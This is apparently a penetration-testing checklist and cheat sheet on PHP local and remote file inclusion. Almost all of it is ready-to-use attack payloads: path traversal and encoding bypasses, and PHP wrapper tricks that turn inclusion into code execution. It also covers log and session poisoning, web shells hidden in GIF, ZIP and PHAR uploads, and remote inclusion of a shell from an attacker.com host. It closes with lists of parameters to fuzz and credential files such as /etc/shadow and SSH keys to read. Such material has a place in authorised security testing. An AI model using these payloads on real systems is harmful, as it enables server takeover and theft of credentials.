# üîç File Inclusion & Path Traversal - Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After identifying a File Inclusion vulnerability, I realistically expect to:

- [ ] Read sensitive files like `/etc/passwd`, `/proc/self/environ`, or logs
- [ ] Execute system commands using wrappers or poisoned logs/sessions
- [ ] Bypass file filters using encodings or path tricks
- [ ] Exploit upload mechanisms (ZIP, GIF, PHAR) to gain shell access
- [ ] Identify parameters vulnerable to LFI/RFI
- [ ] Abuse PHP behaviors to escalate LFI into RCE

---

## ‚úÖ File Inclusion Checklist

- [ ] **Basic File Read Tests**
  - Unix:
    ```
    ?page=../../../../etc/passwd
    ?page=....//....//etc/passwd
    ```
  - Windows:
    ```
    ?page=../../../../windows/win.ini
    ?page=../../../../boot.ini
    ```

- [ ] **Filter Bypasses**
    ```
    ?page=..%252f..%252f..%252fetc%252fpasswd
    ?page=....//....//etc/passwd
    ?page=..///////..////etc////passwd
    ```

- [ ] **Null Byte Injection (PHP < 5.4)**
    ```
    ?page=../../../../etc/passwd%00
    ```

- [ ] **Path Truncation (PHP < 5.3)**
    ```
    ?page=a/../../../../../../etc/passwd/././.
    ```

- [ ] **Start path with fake dir**
    ```
    ?page=fake/../../../../etc/passwd
    ```

---

## ‚úÖ PHP Wrapper Attacks

- [ ] **php://filter**
    ```
    ?page=php://filter/convert.base64-encode/resource=index.php
    ```

- [ ] **data:// (RCE)**
    ```
    ?page=data://text/plain,<?php echo system('ls'); ?>
    ```

- [ ] **zip://**
    ```
    Upload shell.php inside ZIP named shell.jpg
    ?page=zip://uploads/shell.jpg%23shell.php&cmd=id
    ```

- [ ] **phar://**
    ```php
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
    ?>
    ```
    - Run: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
    - Access: `?page=phar://uploads/shell.jpg/shell.txt&cmd=id`

- [ ] **php://input**
    ```
    POST /index.php?page=php://input
    Body: <?php system('id'); ?>
    ```

---

## ‚úÖ Exploitation via Poisoning

- [ ] **Apache/Nginx Log Poisoning**
    ```
    curl http://target/index.php -A "<?php system($_GET['cmd']); ?>"
    ?page=/var/log/apache2/access.log&cmd=id
    ```

- [ ] **Session Poisoning**
    - Inject payload via vulnerable parameter
    - Include session file:
      ```
      /var/lib/php/sessions/sess_<PHPSESSID>
      ```

- [ ] **/proc/self/environ**
    ```
    curl http://target/index.php?page=/proc/self/environ -A "<?php system($_GET['cmd']); ?>"
    ```
---
## ‚úÖ  RFI to RCE (with stealing hash)

- [ ] Via SMB

```c
sudo python3 smbserver.py -smb2support share $(pwd) 130 ‚Üµ alex@ubuntu
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```c
curl '$URL/?parameter=\\tester.server\phpinfo.php'
```

- [ ] Via FTP

```c
# Start FTP server
sudo python3 -m pyftpdlib -p 21                                                                                                                                            1 ‚Üµ alex@ubuntu
[I 2022-07-11 00:04:26] concurrency model: async
[I 2022-07-11 00:04:26] masquerade (NAT) address: None
[I 2022-07-11 00:04:26] passive ports: None
[I 2022-07-11 00:04:26] >>> starting FTP server on 0.0.0.0:21, pid=176948 <<<

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=ftp://tester.server/phpinfo.php'
```

- [ ] Via HTTP

```c
# Create phpinfo.php
echo '<?php phpinfo(); ?>' > phpinfo.php

# Start a web server
python3 -m http.server 80

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=http://tester.server/phpinfo.php'
```



---

## ‚úÖ File Upload + LFI = RCE

- [ ] **GIF Shell**
    ```
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    Upload & Access: ?page=uploads/shell.gif&cmd=id
    ```

- [ ] **ZIP Upload**
    ```
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    zip shell.jpg shell.php
    Upload & Access:
    ?page=zip://uploads/shell.jpg%23shell.php&cmd=id
    ```

- [ ] **PHAR Upload**
    ```
    Use previous phar:// trick with uploaded shell.jpg
    ```

---

## ‚úÖ RFI (Remote File Inclusion)

- [ ] **Serve Malicious PHP File**
    ```php
    <?php
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        system($_REQUEST['cmd']);
        echo "</pre>";
    }
    ?>
    ```

- [ ] **Host & Execute**
    ```
    python3 -m http.server 80
    ?page=http://attacker.com/shell.php&cmd=id
    ```

---

## ‚úÖ LFI2RCE via Other Methods

- [ ] **Access Log Paths to Fuzz**
    ```
    /var/log/apache2/access.log
    /var/log/nginx/access.log
    /var/log/httpd/access.log
    ```

- [ ] **/proc/<pid>/fd/<fd>**
    - Upload many files, brute-force:
      ```
      ?page=/proc/1234/fd/5
      ```

- [ ] **/var/mail/USER**
    - Send PHP payload to internal email
      ```
      ?page=/var/mail/root&cmd=id
      ```

---

## ‚úÖ Assert() Bypass

- [ ] If code has:
    ```php
    assert("strpos('$file', '..') === false");
    ```
  - Bypass with:
    ```
    ?page=' and die(system("id")) or '
    ```

---

## üîé Top 25 LFI/RFI Params (Try Fuzzing)

```
?cat=
?dir=
?action=
?file=
?path=
?folder=
?page=
?include=
?inc=
?locate=
?doc=
?type=
?view=
?layout=
?mod=
?conf=
?load=
?lang=
?template=
?component=
?content=
?item=
?class=
?url=
```

---

## üìÇ Interesting Files to Read (Linux)

- /etc/passwd  
- /etc/shadow (if readable)  
- /proc/self/environ  
- /var/log/apache2/access.log  
- /var/log/apache2/error.log  
- /root/.bash_history  
- /home/user/.ssh/id_rsa  
- /var/mail/root

---

## ‚úÖ Quick Summary Checklist

- [ ] Can I include a file from disk?
- [ ] Can I execute remote code (RFI)?
- [ ] Can I bypass filters using encoding or truncation?
- [ ] Can I use wrappers like php://, data://, zip://, phar://?
- [ ] Can I poison logs or session files?
- [ ] Can I upload and include malicious files?
- [ ] Can I escalate to RCE or shell?
